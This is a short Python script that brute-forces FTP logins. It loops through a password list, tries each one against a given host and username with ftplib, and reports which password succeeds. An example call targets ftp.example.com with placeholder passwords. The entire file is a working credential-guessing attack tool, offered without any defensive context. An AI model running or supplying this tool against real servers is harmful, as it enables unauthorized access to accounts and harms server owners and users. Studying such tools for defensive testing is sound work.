import ftplib

def brute_force_ftp(host, username, password_list):
    # Try each password in the list
    for password in password_list:
        try:
            # Connect to the FTP server
            ftp = ftplib.FTP(host)

            # Log in to the server
            ftp.login(username, password)

            # If the login is successful, print a success message and return
            print(f'Success: password = {password}')
            return
        except ftplib.error_perm:
            # If the login fails, print an error message
            print(f'Error: incorrect password = {password}')

# Example usage
brute_force_ftp('ftp.example.com', 'user', ['password1', 'password2', 'password3'])